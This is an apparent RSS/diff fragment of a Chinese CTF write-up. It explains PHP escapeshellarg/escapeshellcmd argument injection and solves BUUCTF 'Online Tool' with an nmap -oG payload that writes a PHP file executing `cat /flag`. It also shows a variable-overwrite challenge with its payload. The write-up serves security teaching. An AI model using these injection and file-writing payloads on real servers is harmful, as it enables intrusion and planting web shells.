+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="nx">escapeshellcmd&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ls --ignore=&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">escapeshellarg&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$str1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s2">&amp;#34; /tmp&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>ignore 参数需要 linux 环境&lt;/li>
+&lt;/ul>
+&lt;p>结果：
+&lt;img src="https://bu44er.ink/img/Pasted%20image%2020241008025618.png"
+loading="lazy"
+>&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>ls --ignore='zj'\\'' -l \' /tmp&lt;/code> 可化简 &lt;code>ls --ignore=zj\ -l ' /tmp&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>当用户输入包含单引号时，先用 escapeshellarg() 处理会给该单引号添加转义符，再用 escapeshellcmd() 处理时会将该添加的转义符再添加一个转义符，从而导致注入内容可以从==shellarg的单引号中逃逸掉==，造成后续可以进一步利用的参数注入漏洞。&lt;/p>
+&lt;ul>
+&lt;li>如果是先用escapeshellcmd()函数过滤，再用escapeshellarg()函数过滤，则不存在参数注入漏洞&lt;/li>
+&lt;/ul>
+&lt;h4 id="实战-buuctf-2018online-tool">实战： BUUCTF 2018&amp;mdash;Online Tool
+&lt;/h4>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$host&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;host&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$host&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">escapeshellarg&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$host&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$host&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">escapeshellcmd&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$host&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">echo&lt;/span> &lt;span class="nx">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;nmap -T5 -sT -Pn --host-timeout 2 -F &amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nv">$host&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>payload：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">?host=2.2.2.2&amp;#39;&amp;lt;?php echo `cat /flag`;?&amp;gt; -oG test.php&amp;#39;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>-oG 是 nmap 的参数，表示写入前一个参数的内容到后一个参数所指明的文件中&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="变量覆盖">变量覆盖
+&lt;/h2>&lt;h4 id="例题">例题
+&lt;/h4>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">include&lt;/span> &lt;span class="s1">&amp;#39;flag.php&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$yds&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;dog&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$is&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;cat&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$handsome&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;yds&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">foreach&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="nv">$x&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="nv">$y&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$$x&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$y&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">foreach&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="nv">$x&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="nv">$y&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$$x&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$$y&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">foreach&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="nv">$x&lt;/span> &lt;span class="o">=&amp;gt;&lt;/span> &lt;span class="nv">$y&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;flag&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="nv">$x&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$x&lt;/span> &lt;span class="o">!==&lt;/span> &lt;span class="s1">&amp;#39;flag&amp;#39;&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$handsome&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;flag&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;flag&amp;#39;&lt;/span>&lt;span class="p">])){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$yds&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;flag&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;flag&amp;#39;&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;flag&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;flag&amp;#39;&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$is&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;the flag is: &amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nv">$flag&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>payload：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">?is=flag&amp;amp;flag=flag
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>尝试 1. 直接从 echo 输出 2. 从 yds 输出 都不行，被几个 if 条件限制住了，只能从 is 输出。&lt;/p>
+&lt;hr></description></item></channel></rss>
